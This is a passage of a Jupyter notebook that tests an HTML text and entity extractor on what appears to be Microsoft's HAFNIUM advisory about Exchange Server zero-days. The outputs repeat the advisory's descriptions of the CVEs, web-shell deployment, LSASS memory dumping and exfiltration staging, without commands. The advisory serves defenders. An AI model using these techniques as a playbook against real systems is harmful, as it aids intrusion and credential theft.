    "results = (\n",
    "    seq(analyzer.primary_subtree_leafs)\n",
    "    .map(lambda element: product([element], extractor.get_contents(element)))\n",
    "    .flatten()\n",
    "    .starmap(\n",
    "        lambda element, content: product([element], [content], parser.iterscan(content))\n",
    "    )\n",
    "    .flatten()\n",
    "    .cache()\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:35.991643Z",
     "start_time": "2021-10-05T10:22:35.934655Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>Share   </td><td></td><td>&lt;Element button at 0x13340bcc8&gt;</td><td>text</td><td>(165, 174)</td><td>(0, 9) </td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element button at 0x13340bcc8&gt;</td><td>tail</td><td>(183, 185)</td><td>(0, 2) </td></tr>\n",
       "<tr><td>Twitter </td><td></td><td>&lt;Element a at 0x13340bd88&gt;     </td><td>text</td><td>(331, 346)</td><td>(0, 15)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340bd88&gt;     </td><td>tail</td><td>(350, 353)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>LinkedIn</td><td></td><td>&lt;Element a at 0x13340be08&gt;     </td><td>text</td><td>(462, 478)</td><td>(0, 16)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340be08&gt;     </td><td>tail</td><td>(482, 485)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>Facebook</td><td></td><td>&lt;Element a at 0x13340be88&gt;     </td><td>text</td><td>(264, 280)</td><td>(0, 16)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340be88&gt;     </td><td>tail</td><td>(284, 287)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>Email   </td><td></td><td>&lt;Element a at 0x13340bf08&gt;     </td><td>text</td><td>(306, 319)</td><td>(0, 13)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340bf08&gt;     </td><td>tail</td><td>(323, 326)</td><td>(0, 3) </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 407 rows"
      ],
      "text/plain": [
       "[('\\n\\t\\tShare\\t', None, <Element button at 0x13340bcc8>, 'text', (165, 174), (0, 9)), ('\\n\\t', None, <Element button at 0x13340bcc8>, 'tail', (183, 185), (0, 2)), ('\\n\\t\\t\\t\\tTwitter\\t\\t\\t', None, <Element a at 0x13340bd88>, 'text', (331, 346), (0, 15)), ('\\n\\t\\t', None, <Element a at 0x13340bd88>, 'tail', (350, 353), (0, 3)), ('\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t', None, <Element a at 0x13340be08>, 'text', (462, 478), (0, 16)), ('\\n\\t\\t', None, <Element a at 0x13340be08>, 'tail', (482, 485), (0, 3)), ('\\n\\t\\t\\t\\tFacebook\\t\\t\\t', None, <Element a at 0x13340be88>, 'text', (264, 280), (0, 16)), ('\\n\\t\\t', None, <Element a at 0x13340be88>, 'tail', (284, 287), (0, 3)), ('\\n\\t\\t\\t\\tEmail\\t\\t\\t', None, <Element a at 0x13340bf08>, 'text', (306, 319), (0, 13)), ('\\n\\t\\t', None, <Element a at 0x13340bf08>, 'tail', (323, 326), (0, 3)), ('\\n\\t\\t\\t\\tPrint\\t\\t\\t', None, <Element a at 0x13340bf88>, 'text', (69, 82), (0, 13)), ('\\n\\t\\t', None, <Element a at 0x13340bf88>, 'tail', (86, 89), (0, 3)), ('Update [03/16/2021]', None, <Element strong at 0x1333f9108>, 'text', (8, 27), (0, 19)), (': Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: ', None, <Element strong at 0x1333f9108>, 'tail', (36, 198), (0, 162)), ('Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities', None, <Element a at 0x1333f9148>, 'text', (152, 250), (0, 98)), ('.', None, <Element a at 0x1333f9148>, 'tail', (254, 255), (0, 1)), ('Update [03/15/2021]', None, <Element strong at 0x1333f9208>, 'text', (8, 27), (0, 19)), (': Microsoft released a new one-click mitigation tool, the ', None, <Element strong at 0x1333f9208>, 'tail', (36, 94), (0, 58)), ('Microsoft Exchange On-Premises Mitigation Tool', None, <Element a at 0x1333f9248>, 'text', (122, 168), (0, 46)), (', to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange\\u202fServer.\\xa0', None, <Element a at 0x1333f9248>, 'tail', (172, 296), (0, 124)), ('Update [03/08/2021]', None, <Element strong at 0x1333f9308>, 'text', (8, 27), (0, 19)), (': Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises Exchange Server. To aid defenders in investigating these attacks where Microsoft security products and tooling may not be deployed, we are releasing a feed of observed indicators of compromise (IOCs). The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and CSV formats at the below GitHub links. This information is being shared as TLP:WHITE: ', None, <Element strong at 0x1333f9308>, 'tail', (36, 563), (0, 527)), ('CSV format', None, <Element a at 0x1333f9348>, 'text', (196, 206), (0, 10)), (' |\\xa0', None, <Element a at 0x1333f9348>, 'tail', (210, 213), (0, 3)), ('JSON format', None, <Element a at 0x1333f9388>, 'text', (197, 208), (0, 11)), ('Update [03/05/2021]', None, <Element strong at 0x1333f9448>, 'text', (8, 27), (0, 19)), (': Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond HAFNIUM. To aid customers in investigating these attacks, ', None, <Element strong at 0x1333f9448>, 'tail', (36, 225), (0, 189)), ('Microsoft Security Response Center (MSRC) has provided additional resources, including new mitigation guidance: ', None, <Element em at 0x1333f9488>, 'text', (4, 116), (0, 112)), ('Microsoft Exchange Server Vulnerabilities Mitigations – March 2021', None, <Element a at 0x1333f94c8>, 'text', (161, 227), (0, 66)), ('Update [03/04/2021]', None, <Element strong at 0x1333f9588>, 'text', (8, 27), (0, 19)), (': The Exchange Server team released a script for checking HAFNIUM indicators of compromise (IOCs). See ', None, <Element strong at 0x1333f9588>, 'tail', (36, 139), (0, 103)), ('Scan Exchange log files for indicators of compromise', None, <Element a at 0x1333f95c8>, 'text', (20, 72), (0, 52)), ('.', None, <Element a at 0x1333f95c8>, 'tail', (76, 77), (0, 1)), ('Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', None, <Element p at 0x1333f9648>, 'text', (3, 498), (0, 495)), ('\\n', None, <Element p at 0x1333f9648>, 'tail', (739, 740), (0, 1)), ('HAFNIUM', None, <Element a at 0x1333f9688>, 'text', (103, 110), (0, 7)), (', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', None, <Element a at 0x1333f9688>, 'tail', (114, 237), (0, 123)), ('The vulnerabilities recently being exploited were ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (0, 50)), ('CVE-2021-26855', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (50, 64)), (', ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (64, 66)), ('CVE-2021-26857', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (66, 80)), (', ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (80, 82)), ('CVE-2021-26858', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (82, 96)), (', and ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (96, 102)), ('CVE-2021-27065', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (102, 116)), (', all of which were addressed in today’s ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (116, 157)), ('\\n', None, <Element p at 0x1333f96c8>, 'tail', (724, 725), (0, 1)), ('Microsoft Security Response Center (MSRC) release – Multiple Security Updates Released for Exchange Server', None, <Element a at 0x1333f9708>, 'text', (150, 256), (0, 106)), ('. We strongly urge customers to update on-premises systems immediately. Exchange Online is not affected. We have established a resource center that is constantly updated as more information becomes available at ', None, <Element a at 0x1333f9708>, 'tail', (260, 471), (0, 211)), ('.', None, <Element strong at 0x1333f9748>, 'tail', (28, 29), (0, 1)), ('https://aka.ms/ExchangeVulns', 'URI', <Element a at 0x1333f9788>, 'text', (9, 37), (0, 28)), ('We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem. This blog also continues our mission to shine a light on malicious actors and elevate awareness of the sophisticated tactics and techniques used to target our customers. The related IOCs, ', None, <Element p at 0x1333f97c8>, 'text', (3, 472), (0, 469)), ('\\n', None, <Element p at 0x1333f97c8>, 'tail', (878, 879), (0, 1)), ('Azure Sentinel', None, <Element a at 0x1333f9808>, 'text', (69, 83), (0, 14)), (' advanced hunting queries, and\\xa0', None, <Element a at 0x1333f9808>, 'tail', (87, 118), (0, 31)), ('Microsoft Defender for Endpoint', None, <Element a at 0x1333f9848>, 'text', (83, 114), (0, 31)), (' product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation.', None, <Element a at 0x1333f9848>, 'tail', (118, 284), (0, 166)), ('Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation. Volexity has also ', None, <Element p at 0x1333f9888>, 'text', (3, 193), (0, 190)), ('\\n', None, <Element p at 0x1333f9888>, 'tail', (546, 547), (0, 1)), ('published a blog post', None, <Element a at 0x1333f98c8>, 'text', (118, 139), (0, 21)), (' with their analysis. It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all.', None, <Element a at 0x1333f98c8>, 'tail', (143, 349), (0, 206)), ('Who is HAFNIUM?', None, <Element h2 at 0x1333f9908>, 'text', (4, 19), (0, 15)), ('\\n', None, <Element h2 at 0x1333f9908>, 'tail', (24, 25), (0, 1)), ('HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.', None, <Element p at 0x1333f9948>, 'text', (3, 230), (0, 227)), ('\\n', None, <Element p at 0x1333f9948>, 'tail', (234, 235), (0, 1)), ('HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like ', None, <Element p at 0x1333f9988>, 'text', (3, 157), (0, 154)), ('\\n', None, <Element p at 0x1333f9988>, 'tail', (390, 391), (0, 1)), ('Covenant', None, <Element a at 0x1333f99c8>, 'text', (34, 42), (0, 8)), (', for command and control. Once they’ve gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like ', None, <Element a at 0x1333f99c8>, 'tail', (56, 193), (0, 137)), ('MEGA', None, <Element a at 0x1333f9a08>, 'text', (27, 31), (0, 4)), ('.', None, <Element a at 0x1333f9a08>, 'tail', (35, 36), (0, 1)), ('In campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets’ environments.', None, <Element p at 0x1333f9a48>, 'text', (3, 301), (0, 298)), ('\\n', None, <Element p at 0x1333f9a48>, 'tail', (305, 306), (0, 1)), ('HAFNIUM operates primarily from leased virtual private servers (VPS) in the United States.', None, <Element p at 0x1333f9a88>, 'text', (3, 93), (0, 90)), ('\\n', None, <Element p at 0x1333f9a88>, 'tail', (97, 98), (0, 1)), ('Technical details', None, <Element h2 at 0x1333f9ac8>, 'text', (4, 21), (0, 17)), ('\\n', None, <Element h2 at 0x1333f9ac8>, 'tail', (26, 27), (0, 1)), ('Microsoft is providing the following details to help our customers understand the techniques used by HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems.', None, <Element p at 0x1333f9b08>, 'text', (3, 232), (0, 229)), ('\\n', None, <Element p at 0x1333f9b08>, 'tail', (236, 237), (0, 1)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9b88>, 'text', (63, 77), (0, 14)), (' is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.', None, <Element a at 0x1333f9b88>, 'tail', (139, 305), (0, 166)), ('CVE-2021-26857', 'CVE', <Element a at 0x1333f9c08>, 'text', (63, 77), (0, 14)), (' is an insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to exploit.', None, <Element a at 0x1333f9c08>, 'tail', (139, 492), (0, 353)), ('CVE-2021-26858', 'CVE', <Element a at 0x1333f9c88>, 'text', (63, 77), (0, 14)), (' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', None, <Element a at 0x1333f9c88>, 'tail', (139, 478), (0, 253)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9c88>, 'tail', (139, 478), (253, 267)), (' SSRF vulnerability or by compromising a legitimate admin’s credentials.', None, <Element a at 0x1333f9c88>, 'tail', (139, 478), (267, 339)), ('CVE-2021-27065', 'CVE', <Element a at 0x1333f9d08>, 'text', (63, 77), (0, 14)), (' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', None, <Element a at 0x1333f9d08>, 'tail', (139, 478), (0, 253)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9d08>, 'tail', (139, 478), (253, 267)), (' SSRF vulnerability or by compromising a legitimate admin’s credentials.', None, <Element a at 0x1333f9d08>, 'tail', (139, 478), (267, 339)), ('Attack details', None, <Element h2 at 0x1333f9d48>, 'text', (4, 18), (0, 14)), ('\\n', None, <Element h2 at 0x1333f9d48>, 'tail', (23, 24), (0, 1)), ('After exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed web shells on the compromised server. Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise. One example of a web shell deployed by HAFNIUM, written in ASP, is below:', None, <Element p at 0x1333f9d88>, 'text', (3, 331), (0, 328)), ('\\n', None, <Element p at 0x1333f9d88>, 'tail', (335, 336), (0, 1)), ('Following web shell deployment, HAFNIUM operators performed the following post-exploitation activity:', None, <Element p at 0x1333f9e48>, 'text', (3, 104), (0, 101)), ('\\n', None, <Element p at 0x1333f9e48>, 'tail', (108, 109), (0, 1)), ('Using Procdump to dump the LSASS process memory:', None, <Element li at 0x1333f9ec8>, 'text', (4, 52), (0, 48)), ('\\n', None, <Element li at 0x1333f9ec8>, 'tail', (57, 58), (0, 1)), ('Using 7-Zip to compress stolen data into ZIP files for exfiltration:', None, <Element li at 0x1333f9fc8>, 'text', (4, 72), (0, 68)), ...]"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results.starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:36.096475Z",
     "start_time": "2021-10-05T10:22:36.020408Z"
    }
   },
   "outputs": [],
   "source": [
    "product_by_contents = lambda element: product(\n",
    "    [element], extractor.get_contents(element)\n",
    ")\n",
    "\n",
    "product_by_entities = lambda element, content: product(\n",
    "    [element], [content], parser.iterscan(content)\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:22:45.803355Z",
     "start_time": "2021-10-05T10:22:36.108244Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>Share   </td><td></td><td>&lt;Element button at 0x13340bcc8&gt;</td><td>text</td><td>(165, 174)</td><td>(0, 9) </td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element button at 0x13340bcc8&gt;</td><td>tail</td><td>(183, 185)</td><td>(0, 2) </td></tr>\n",
       "<tr><td>Twitter </td><td></td><td>&lt;Element a at 0x13340bd88&gt;     </td><td>text</td><td>(331, 346)</td><td>(0, 15)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340bd88&gt;     </td><td>tail</td><td>(350, 353)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>LinkedIn</td><td></td><td>&lt;Element a at 0x13340be08&gt;     </td><td>text</td><td>(462, 478)</td><td>(0, 16)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340be08&gt;     </td><td>tail</td><td>(482, 485)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>Facebook</td><td></td><td>&lt;Element a at 0x13340be88&gt;     </td><td>text</td><td>(264, 280)</td><td>(0, 16)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340be88&gt;     </td><td>tail</td><td>(284, 287)</td><td>(0, 3) </td></tr>\n",
       "<tr><td>Email   </td><td></td><td>&lt;Element a at 0x13340bf08&gt;     </td><td>text</td><td>(306, 319)</td><td>(0, 13)</td></tr>\n",
       "<tr><td>        </td><td></td><td>&lt;Element a at 0x13340bf08&gt;     </td><td>tail</td><td>(323, 326)</td><td>(0, 3) </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 407 rows"
      ],
      "text/plain": [
       "[('\\n\\t\\tShare\\t', None, <Element button at 0x13340bcc8>, 'text', (165, 174), (0, 9)), ('\\n\\t', None, <Element button at 0x13340bcc8>, 'tail', (183, 185), (0, 2)), ('\\n\\t\\t\\t\\tTwitter\\t\\t\\t', None, <Element a at 0x13340bd88>, 'text', (331, 346), (0, 15)), ('\\n\\t\\t', None, <Element a at 0x13340bd88>, 'tail', (350, 353), (0, 3)), ('\\n\\t\\t\\t\\tLinkedIn\\t\\t\\t', None, <Element a at 0x13340be08>, 'text', (462, 478), (0, 16)), ('\\n\\t\\t', None, <Element a at 0x13340be08>, 'tail', (482, 485), (0, 3)), ('\\n\\t\\t\\t\\tFacebook\\t\\t\\t', None, <Element a at 0x13340be88>, 'text', (264, 280), (0, 16)), ('\\n\\t\\t', None, <Element a at 0x13340be88>, 'tail', (284, 287), (0, 3)), ('\\n\\t\\t\\t\\tEmail\\t\\t\\t', None, <Element a at 0x13340bf08>, 'text', (306, 319), (0, 13)), ('\\n\\t\\t', None, <Element a at 0x13340bf08>, 'tail', (323, 326), (0, 3)), ('\\n\\t\\t\\t\\tPrint\\t\\t\\t', None, <Element a at 0x13340bf88>, 'text', (69, 82), (0, 13)), ('\\n\\t\\t', None, <Element a at 0x13340bf88>, 'tail', (86, 89), (0, 3)), ('Update [03/16/2021]', None, <Element strong at 0x1333f9108>, 'text', (8, 27), (0, 19)), (': Microsoft released updated tools and investigation guidance to help IT Pros and incident response teams identify, remediate, defend against associated attacks: ', None, <Element strong at 0x1333f9108>, 'tail', (36, 198), (0, 162)), ('Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities', None, <Element a at 0x1333f9148>, 'text', (152, 250), (0, 98)), ('.', None, <Element a at 0x1333f9148>, 'tail', (254, 255), (0, 1)), ('Update [03/15/2021]', None, <Element strong at 0x1333f9208>, 'text', (8, 27), (0, 19)), (': Microsoft released a new one-click mitigation tool, the ', None, <Element strong at 0x1333f9208>, 'tail', (36, 94), (0, 58)), ('Microsoft Exchange On-Premises Mitigation Tool', None, <Element a at 0x1333f9248>, 'text', (122, 168), (0, 46)), (', to help customers who do not have dedicated security or IT teams to apply security updates for Microsoft Exchange\\u202fServer.\\xa0', None, <Element a at 0x1333f9248>, 'tail', (172, 296), (0, 124)), ('Update [03/08/2021]', None, <Element strong at 0x1333f9308>, 'text', (8, 27), (0, 19)), (': Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises Exchange Server. To aid defenders in investigating these attacks where Microsoft security products and tooling may not be deployed, we are releasing a feed of observed indicators of compromise (IOCs). The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and CSV formats at the below GitHub links. This information is being shared as TLP:WHITE: ', None, <Element strong at 0x1333f9308>, 'tail', (36, 563), (0, 527)), ('CSV format', None, <Element a at 0x1333f9348>, 'text', (196, 206), (0, 10)), (' |\\xa0', None, <Element a at 0x1333f9348>, 'tail', (210, 213), (0, 3)), ('JSON format', None, <Element a at 0x1333f9388>, 'text', (197, 208), (0, 11)), ('Update [03/05/2021]', None, <Element strong at 0x1333f9448>, 'text', (8, 27), (0, 19)), (': Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond HAFNIUM. To aid customers in investigating these attacks, ', None, <Element strong at 0x1333f9448>, 'tail', (36, 225), (0, 189)), ('Microsoft Security Response Center (MSRC) has provided additional resources, including new mitigation guidance: ', None, <Element em at 0x1333f9488>, 'text', (4, 116), (0, 112)), ('Microsoft Exchange Server Vulnerabilities Mitigations – March 2021', None, <Element a at 0x1333f94c8>, 'text', (161, 227), (0, 66)), ('Update [03/04/2021]', None, <Element strong at 0x1333f9588>, 'text', (8, 27), (0, 19)), (': The Exchange Server team released a script for checking HAFNIUM indicators of compromise (IOCs). See ', None, <Element strong at 0x1333f9588>, 'tail', (36, 139), (0, 103)), ('Scan Exchange log files for indicators of compromise', None, <Element a at 0x1333f95c8>, 'text', (20, 72), (0, 52)), ('.', None, <Element a at 0x1333f95c8>, 'tail', (76, 77), (0, 1)), ('Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', None, <Element p at 0x1333f9648>, 'text', (3, 498), (0, 495)), ('\\n', None, <Element p at 0x1333f9648>, 'tail', (739, 740), (0, 1)), ('HAFNIUM', None, <Element a at 0x1333f9688>, 'text', (103, 110), (0, 7)), (', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', None, <Element a at 0x1333f9688>, 'tail', (114, 237), (0, 123)), ('The vulnerabilities recently being exploited were ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (0, 50)), ('CVE-2021-26855', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (50, 64)), (', ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (64, 66)), ('CVE-2021-26857', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (66, 80)), (', ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (80, 82)), ('CVE-2021-26858', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (82, 96)), (', and ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (96, 102)), ('CVE-2021-27065', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (102, 116)), (', all of which were addressed in today’s ', None, <Element p at 0x1333f96c8>, 'text', (3, 160), (116, 157)), ('\\n', None, <Element p at 0x1333f96c8>, 'tail', (724, 725), (0, 1)), ('Microsoft Security Response Center (MSRC) release – Multiple Security Updates Released for Exchange Server', None, <Element a at 0x1333f9708>, 'text', (150, 256), (0, 106)), ('. We strongly urge customers to update on-premises systems immediately. Exchange Online is not affected. We have established a resource center that is constantly updated as more information becomes available at ', None, <Element a at 0x1333f9708>, 'tail', (260, 471), (0, 211)), ('.', None, <Element strong at 0x1333f9748>, 'tail', (28, 29), (0, 1)), ('https://aka.ms/ExchangeVulns', 'URI', <Element a at 0x1333f9788>, 'text', (9, 37), (0, 28)), ('We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem. This blog also continues our mission to shine a light on malicious actors and elevate awareness of the sophisticated tactics and techniques used to target our customers. The related IOCs, ', None, <Element p at 0x1333f97c8>, 'text', (3, 472), (0, 469)), ('\\n', None, <Element p at 0x1333f97c8>, 'tail', (878, 879), (0, 1)), ('Azure Sentinel', None, <Element a at 0x1333f9808>, 'text', (69, 83), (0, 14)), (' advanced hunting queries, and\\xa0', None, <Element a at 0x1333f9808>, 'tail', (87, 118), (0, 31)), ('Microsoft Defender for Endpoint', None, <Element a at 0x1333f9848>, 'text', (83, 114), (0, 31)), (' product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation.', None, <Element a at 0x1333f9848>, 'tail', (118, 284), (0, 166)), ('Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation. Volexity has also ', None, <Element p at 0x1333f9888>, 'text', (3, 193), (0, 190)), ('\\n', None, <Element p at 0x1333f9888>, 'tail', (546, 547), (0, 1)), ('published a blog post', None, <Element a at 0x1333f98c8>, 'text', (118, 139), (0, 21)), (' with their analysis. It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all.', None, <Element a at 0x1333f98c8>, 'tail', (143, 349), (0, 206)), ('Who is HAFNIUM?', None, <Element h2 at 0x1333f9908>, 'text', (4, 19), (0, 15)), ('\\n', None, <Element h2 at 0x1333f9908>, 'tail', (24, 25), (0, 1)), ('HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.', None, <Element p at 0x1333f9948>, 'text', (3, 230), (0, 227)), ('\\n', None, <Element p at 0x1333f9948>, 'tail', (234, 235), (0, 1)), ('HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like ', None, <Element p at 0x1333f9988>, 'text', (3, 157), (0, 154)), ('\\n', None, <Element p at 0x1333f9988>, 'tail', (390, 391), (0, 1)), ('Covenant', None, <Element a at 0x1333f99c8>, 'text', (34, 42), (0, 8)), (', for command and control. Once they’ve gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like ', None, <Element a at 0x1333f99c8>, 'tail', (56, 193), (0, 137)), ('MEGA', None, <Element a at 0x1333f9a08>, 'text', (27, 31), (0, 4)), ('.', None, <Element a at 0x1333f9a08>, 'tail', (35, 36), (0, 1)), ('In campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets’ environments.', None, <Element p at 0x1333f9a48>, 'text', (3, 301), (0, 298)), ('\\n', None, <Element p at 0x1333f9a48>, 'tail', (305, 306), (0, 1)), ('HAFNIUM operates primarily from leased virtual private servers (VPS) in the United States.', None, <Element p at 0x1333f9a88>, 'text', (3, 93), (0, 90)), ('\\n', None, <Element p at 0x1333f9a88>, 'tail', (97, 98), (0, 1)), ('Technical details', None, <Element h2 at 0x1333f9ac8>, 'text', (4, 21), (0, 17)), ('\\n', None, <Element h2 at 0x1333f9ac8>, 'tail', (26, 27), (0, 1)), ('Microsoft is providing the following details to help our customers understand the techniques used by HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems.', None, <Element p at 0x1333f9b08>, 'text', (3, 232), (0, 229)), ('\\n', None, <Element p at 0x1333f9b08>, 'tail', (236, 237), (0, 1)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9b88>, 'text', (63, 77), (0, 14)), (' is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.', None, <Element a at 0x1333f9b88>, 'tail', (139, 305), (0, 166)), ('CVE-2021-26857', 'CVE', <Element a at 0x1333f9c08>, 'text', (63, 77), (0, 14)), (' is an insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to exploit.', None, <Element a at 0x1333f9c08>, 'tail', (139, 492), (0, 353)), ('CVE-2021-26858', 'CVE', <Element a at 0x1333f9c88>, 'text', (63, 77), (0, 14)), (' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', None, <Element a at 0x1333f9c88>, 'tail', (139, 478), (0, 253)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9c88>, 'tail', (139, 478), (253, 267)), (' SSRF vulnerability or by compromising a legitimate admin’s credentials.', None, <Element a at 0x1333f9c88>, 'tail', (139, 478), (267, 339)), ('CVE-2021-27065', 'CVE', <Element a at 0x1333f9d08>, 'text', (63, 77), (0, 14)), (' is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the ', None, <Element a at 0x1333f9d08>, 'tail', (139, 478), (0, 253)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9d08>, 'tail', (139, 478), (253, 267)), (' SSRF vulnerability or by compromising a legitimate admin’s credentials.', None, <Element a at 0x1333f9d08>, 'tail', (139, 478), (267, 339)), ('Attack details', None, <Element h2 at 0x1333f9d48>, 'text', (4, 18), (0, 14)), ('\\n', None, <Element h2 at 0x1333f9d48>, 'tail', (23, 24), (0, 1)), ('After exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed web shells on the compromised server. Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise. One example of a web shell deployed by 